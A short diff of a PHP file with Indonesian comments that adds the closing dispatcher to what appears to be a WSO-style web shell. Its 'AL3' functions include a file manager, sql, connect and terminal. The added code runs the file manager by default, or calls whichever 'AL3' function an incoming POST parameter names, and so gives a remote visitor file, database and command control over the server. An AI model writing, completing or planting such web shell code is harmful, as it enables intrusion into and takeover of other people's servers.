@@ -57,4 +57,15 @@ function AL3FilesMan2() {
 }
 
 // Tambahkan sisa fungsi AL3 : sql, connect, terminal, etc...
+// --- BARIS TERAKHIR SCRIPT AL3 CORE LO ---
+
+if(empty($_POST['a'])) {
+    // Jika tidak ada aksi, paksa tampilkan File Manager
+    AL3FilesMan2(); 
+} elseif(function_exists('AL3' . $_POST['a'])) {
+    // Jalankan fungsi sesuai kiriman menu
+    call_user_func('AL3' . $_POST['a']);
+}
+
+exit;
 ?>
